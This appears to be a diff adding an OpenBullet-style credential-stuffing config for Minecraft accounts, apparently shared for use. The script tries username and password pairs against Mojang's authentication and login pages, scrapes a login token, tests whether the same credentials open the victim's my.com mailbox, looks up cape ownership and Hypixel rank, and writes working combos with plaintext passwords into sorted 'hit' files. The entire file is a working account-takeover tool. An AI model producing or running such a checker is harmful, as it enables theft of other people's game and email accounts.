@@ -1,0 +1,218 @@
+[SETTINGS]
+{
+  "Name": "Minecraft",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-21T12:27:41.3472344+02:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://authserver.mojang.com/authenticate" 
+  CONTENT "{\"password\":\"<PASS>\",\"requestUser\":true,\"username\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fr;q=0.8,ar;q=0.7" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 230" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Host: authserver.mojang.com" 
+  HEADER "Origin: https://www.minecraft.net" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.minecraft.net/" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "accessToken" 
+  KEYCHAIN Failure OR 
+    KEY "\"error\":\"ForbiddenOperationException\",\"errorMessage\":\"Forbidden\"" 
+    KEY "\"error\":\"ForbiddenOperationException\",\"errorMessage\":\"Invalid credentials. Invalid username or password.\"" 
+    KEY "{\"error\":\"ForbiddenOperationException\",\"errorMessage\":\"Invalid credentials. Invalid username or password.\"}" 
+
+PARSE "<SOURCE>" JSON "accessToken" -> VAR "accessToken" 
+
+REQUEST GET "https://api.minecraftservices.com/minecraft/profile" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authorization: Bearer <accessToken>" 
+
+PARSE "<SOURCE>" JSON "name" CreateEmpty=FALSE -> CAP "Username" 
+
+REQUEST GET "https://account.mojang.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "name=\"authenticityToken\" value=\"" "\"/>" -> VAR "T" 
+
+REQUEST POST "https://account.mojang.com/login" 
+  CONTENT "authenticityToken=<T>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fr;q=0.8,ar;q=0.7" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 231" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: account.mojang.com" 
+  HEADER "Origin: https://account.mojang.com" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://account.mojang.com/login" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "title=\"Log out\"" 
+  KEYCHAIN Failure OR 
+    KEY "<strong>Error!</strong> Unknown e-mail address or password" 
+
+IF "<SOURCE>" Contains "Your account has not been secured"
+SET CAP "SFA" "True"
+SET CAP "NFA" "False"
+ELSE
+SET CAP "SFA" "False"
+SET CAP "NFA" "True"
+ENDIF
+
+REQUEST POST "https://aj-https.my.com/cgi-bin/auth?Lang=en_DZ&mp=android&mmp=mail&DeviceID=a629f92b3e336806a0115273345585ab&client=mobile&udid=33eaf7b0809f52ca857942f539d41107765fdda700c841158860353a08fdf5b4&instanceid=d3vEDdMTXAo&playservices=205016013&connectid=9c222eca291828cde682de364e2af2f0&os=Android&os_version=5.1.1&ver=com.my.mail13.2.0.31590&appbuild=31590&vendor=samsung&model=SM-G973N&device_type=Smartphone&country=DZ&language=en_DZ&timezone=GMT%2B01%3A00&device_name=samsung%20SM-G973N&DeviceInfo=%7B%22OS%22%3A%22Android%22%2C%22AppVersion%22%3A%22com.my.mail13.2.0.31590%22%2C%22AppBuild%22%3A%2231590%22%2C%22Device%22%3A%22samsung%20SM-G973N%22%2C%22Timezone%22%3A%22GMT%2B01%3A00%22%2C%22DeviceName%22%3A%22samsung%20SM-G973N%22%2C%22Useragent%22%3A%22Mozilla%5C%2F5.0%20(Linux%3B%20Android%205.1.1%3B%20SM-G973N%20Build%5C%2FPPR1.190810.011%3B%20wv)%20AppleWebKit%5C%2F537.36%20(KHTML%2C%20like%20Gecko)%20Version%5C%2F4.0%20Chrome%5C%2F74.0.3729.136%20Mobile%20Safari%5C%2F537.36%22%2C%22playservices%22%3A%22205016013%22%2C%22connectid%22%3A%229c222eca291828cde682de364e2af2f0%22%7D&idfa=e2970ece-a48e-401f-9083-d2f9443e9497&appsflyerid=1612212907645-2691469414791781351&current=google&first=google&md5_signature=090176aada41981fb2971a58587ded55" 
+  CONTENT "Password=<PASS>&oauth2=0&Login=<USER>&mobile=1&mob_json=1&simple=1&useragent=android&md5_post_signature=910e510a3e758a1d760f388bc10c1ab0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: mobmail android 13.2.0.31590 com.my.mail" 
+  HEADER "X-Mobile-App: e552fda2e6c711eaadc10242ac120002" 
+  HEADER "Host: aj-https.my.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 170" 
+
+IF "<SOURCE>" Contains "Ok=1"
+SET CAP "MFA" "True"
+ELSE
+SET CAP "MFA" "False"
+ENDIF
+
+REQUEST GET "https://namemc.com/profile/<Username>.1" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+IF "<SOURCE>" Contains "OptiFine"
+SET CAP "OptiFine Cape" "True"
+ELSE
+SET CAP "OptiFine Cape" "False"
+ENDIF
+
+REQUEST GET "https://plancke.io/hypixel/player/stats/<Username>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+FUNCTION Constant "20.00" -> VAR "+20" 
+
+PARSE "<SOURCE>" LR "Level:</b> " "<br" CreateEmpty=FALSE -> CAP "Hypixel Level" 
+
+PARSE "<SOURCE>" LR "content=\"[" "]" CreateEmpty=FALSE -> CAP "Hypixel Rank" 
+
+FUNCTION Constant "9LIMBO" -> CAP "By" 
+
+ENDIF
+IF "<SFA>" EqualTo "True"
+
+UTILITY File "SFA.txt" AppendLines "««««««««««««««««««[Account]»»»»»»»»»»»»»»»»»»\\nCombo: <USER>:<PASS>\\nEmail: <USER>\\nPassword: <PASS>\\nUsername: <Username>\\nSFA: <SFA>\\nNFA: <NFA>\\nOptiFine Cape: <OptiFine Cape>\\nHypixel Level: <Hypixel Level>\\nHypixel Rank: <Hypixel Rank>" 
+
+ENDIF
+IF "<SFA>" EqualTo "False"
+
+UTILITY File "NFA.txt" AppendLines "««««««««««««««««««[Account]»»»»»»»»»»»»»»»»»»\\nCombo: <USER>:<PASS>\\nEmail: <USER>\\nPassword: <PASS>\\nUsername: <Username>\\nSFA: <SFA>\\nNFA: <NFA>\\nOptiFine Cape: <OptiFine Cape>\\nHypixel Level: <Hypixel Level>\\nHypixel Rank: <Hypixel Rank>" 
+
+ENDIF
+IF "<OptiFine Cape>" EqualTo "True"
+
+UTILITY File "OptiFine Cape.txt" AppendLines "««««««««««««««««««[Account]»»»»»»»»»»»»»»»»»»\\nCombo: <USER>:<PASS>\\nEmail: <USER>\\nPassword: <PASS>\\nUsername: <Username>\\nSFA: <SFA>\\nNFA: <NFA>\\nOptiFine Cape: <OptiFine Cape>\\nHypixel Level: <Hypixel Level>\\nHypixel Rank: <Hypixel Rank>" 
+
+ENDIF
+IF "<Hypixel Level>" GreaterThan "<+20>"
+
+UTILITY File "Hypixel Leveled [+20].txt" AppendLines "««««««««««««««««««[Account]»»»»»»»»»»»»»»»»»»\\nCombo: <USER>:<PASS>\\nEmail: <USER>\\nPassword: <PASS>\\nUsername: <Username>\\nSFA: <SFA>\\nNFA: <NFA>\\nOptiFine Cape: <OptiFine Cape>\\nHypixel Level: <Hypixel Level>\\nHypixel Rank: <Hypixel Rank>" 
+
+ENDIF
+IF "<Hypixel Rank>" Exists
+
+UTILITY File "Hypixel Ranked.txt" AppendLines "««««««««««««««««««[Account]»»»»»»»»»»»»»»»»»»\\nCombo: <USER>:<PASS>\\nEmail: <USER>\\nPassword: <PASS>\\nUsername: <Username>\\nSFA: <SFA>\\nNFA: <NFA>\\nOptiFine Cape: <OptiFine Cape>\\nHypixel Level: <Hypixel Level>\\nHypixel Rank: <Hypixel Rank>" -> VAR "Utility1" 
+
+ENDIF
+IF "<Hypixel Level>" GreaterThan "<+20>"
+IF "<Hypixel Rank>" Exists ""
+
+UTILITY File "Hypixel Leveld [+20] + Ranked.txt" AppendLines "««««««««««««««««««[Account]»»»»»»»»»»»»»»»»»»\\nCombo: <USER>:<PASS>\\nEmail: <USER>\\nPassword: <PASS>\\nUsername: <Username>\\nSFA: <SFA>\\nNFA: <NFA>\\nOptiFine Cape: <OptiFine Cape>\\nHypixel Level: <Hypixel Level>\\nHypixel Rank: <Hypixel Rank>" 
+
+ENDIF
+IF "<MFA>" EqualTo "True"
+
+UTILITY File "MFA.txt" AppendLines "««««««««««««««««««[Account]»»»»»»»»»»»»»»»»»»\\nCombo: <USER>:<PASS>\\nEmail: <USER>\\nPassword: <PASS>\\nUsername: <Username>\\nSFA: <SFA>\\nNFA: <NFA>\\nOptiFine Cape: <OptiFine Cape>\\nHypixel Level: <Hypixel Level>\\nHypixel Rank: <Hypixel Rank>" 
+
+ENDIF
+
